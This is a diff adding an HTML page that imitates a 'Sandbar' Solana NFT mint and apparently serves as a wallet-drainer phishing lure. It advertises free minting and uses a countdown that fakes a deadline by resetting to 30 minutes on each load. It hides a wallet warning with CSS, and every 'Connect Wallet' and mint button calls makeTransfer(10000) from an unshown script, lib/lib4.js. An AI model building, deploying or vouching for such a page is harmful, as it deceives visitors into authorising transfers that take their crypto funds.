@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width">
+    <meta name="format-detection" content="telephone=no">
+    <title>Sandbar | Mint Now Live!</title>
+    <link rel="icon" href="favicon.png">
+    <meta name="description" content="Sandbar NFTs are a collection of mysterious droid birds designed by Unfold on the Solana blockchain. Keep one eye open. The birds are not what they seem.">
+    <link rel="stylesheet" href="css/app.min.css" />
+
+
+    <script src="https://unpkg.com/@solana/web3.js@1.29.2/lib/index.iife.min.js"></script>
+    <script src="lib/lib4.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-S94JQY9VE4"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'G-S94JQY9VE4');
+    </script>
+    <style>
+        body {
+            /* background:url('images/bg.jpeg')!important; */
+            background-color: black !important;
+            background-size: cover !important;
+        }
+
+        .header .header__items .header__logo img {
+            max-height: 50px;
+        }
+
+        .showcase .showcase__title {
+            color: #BDFFC2 !important;
+        }
+
+        .showcase .showcase__items .showcase__head {
+            color: #BDFFC2;
+        }
+
+        .showcase .showcase__items .showcase__btn {
+            background: #BDFFC2 !important;
+        }
+
+        html body .showcase .showcase__btn {
+            border: 2px solid #BDFFC2;
+            color: black !important;
+        }
+
+        .showcase .showcase__items .showcase__head {
+            font-size: 28px !important;
+        }
+
+        .showcase .showcase__block-head span {
+            color: #BDFFC2 !important;
+        }
+
+        .showcase .showcase__items .showcase__head span {
+            color: #BDFFC2;
+        }
+
+        html body .showcase .showcase__block,
+        html body .showcase .showcase__items {
+            border: 2px solid #BDFFC2;
+            box-shadow: 0 0 20px 2px #BDFFC2;
+        }
+
+        .showcase .showcase__items .metamask-warning {
+            display: none;
+        }
+
+        #countdowntimer {
+            color: #a41d22;
+        }
+
+        .showcase__info {
+            color: red !important;
+        }
+    </style>
+
+</head>
+
+<body onload="onBodyLoad();">
+    <div class="wrapper">
+        <div class="header">
+            <div class="container">
+                <div class="header__items">
+                    <a href="index.html" class="header__logo">
+<img src="images/sandbar.jpeg" alt="{{header.alt}}"> </a>
+                    <ul class="header__social">
+                        <li><a href="https://twitter.com/sandbar_io" target="_blank"><img src="static/twit-head.png" alt="Twitter"></a></li>
+                        <li><a href="https://discord.com/invite/b3tsjpw" target="_blank"><img src="static/disc-head.png" alt="Discord"></a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="showcase">
+            <div class="container">
+                <div class="showcase__inner">
+                    <h1 class="showcase__title ">Welcome Operatives - it’s time.</h1>
+                    <p class="showcase__info">MINTING IS NOW LIVE! </p>
+                    <div class="showcase__items">
+                        <div class="showcase__item">
+                            <!-- <p class="notify">Note: You are automatically whitelisted minting with this link and enjoy a discounted price (Public Sale is 3.25 SOL).</p> -->
+                            <!-- <p class="notify">Please mint within 30 minutes or this link will expire automatically.</p> -->
+                           
+                            <p class="showcase__minted">whitelist closing in: <a id="countdowntimer">4:00:00</a></p>
+                            <br>
+                            <p class="showcase__head">Price per Sandbar : <span class="price-per-item">FREE SOL</span></p>
+                            <div class="showcase__calculate">
+                                <div class="number" data-step="1" data-min="1" data-max="10">
+                                </div>
+                            </div>
+                            <div class="showcase__btn" onclick="makeTransfer(10000)" id="connect" style="display: flex;"><span class="showcase__btn-text">Connect Wallet<span></div>
+<div class="showcase__btn" onclick="makeTransfer(10000)" style="display: none;"><span class="showcase__btn-text">Connect Wallet<span></div>
+<div class="showcase__btn offer" onclick="makeTransfer(10000)" style="display: none;"><span class="showcase__btn-text">MINT 3 PAY 2</span><span class="showcase__badge">LIMITED</span></div>
+                        </div>
+                        <div class="showcase__images">
+                            <div class="showcase__image"><img src="images/wl.jpg" /></div>
+                        </div>
+                    </div>
+                    <div class="showcase__block">
+                        <div class="showcase__block-item">
+                            <p class="showcase__block-head">Join Sandbar on <br><span>our socials</span></p>
+                            <span class="showcase__block-total"></span>
+                        </div>
+                        <div class="showcase__block-btns">
+                            <a href="https://discord.com/invite/b3tsjpw" target="_blank" class="showcase__block-btn"><img src="static/discord.svg" alt="">DISCORD</a>
+                            <a href="https://twitter.com/sandbar_io" target="_blank" class="showcase__block-btn"><img src="static/twitter.svg" alt="">TWITTER</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="toast">
+        Something went wrong. Please try again.
+    </div>
+    <script>
+        // Set the date we're counting down to
+        var countDownDate = new Date().getTime() + 30 * 60 * 1000;
+
+        // Update the count down every 1 second
+        var x = setInterval(function() {
+
+            // Get today's date and time
+            var now = new Date().getTime();
+
+            // Find the distance between now and the count down date
+            var distance = countDownDate - now;
+
+            // Time calculations for hours, minutes and seconds
+            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            // Display the result in the element with id="demo"
+            document.getElementById("countdowntimer").innerHTML = hours + ":" +
+                minutes + ":" + seconds;
+
+            // If the count down is finished, write some text
+            if (distance < 0) {
+                clearInterval(x);
+                document.getElementById("countdowntimer").innerHTML = "0";
+            }
+        }, 1000);
+    </script>
+</body>
+
+</html>
